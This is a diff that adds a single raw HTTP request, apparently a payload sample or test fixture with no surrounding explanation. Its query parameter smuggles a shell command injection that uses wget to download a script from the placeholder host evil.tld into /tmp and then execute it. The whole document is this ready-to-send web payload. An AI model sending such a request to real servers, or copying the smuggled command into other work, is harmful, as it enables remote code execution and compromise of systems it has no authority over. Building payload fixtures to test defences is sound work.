@@ -1,0 +1,4 @@
+GET /a?data=';%20wget%20http://evil.tld/s.sh%20-O%20/tmp/s.sh;%20sh%20/tmp/s.sh' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
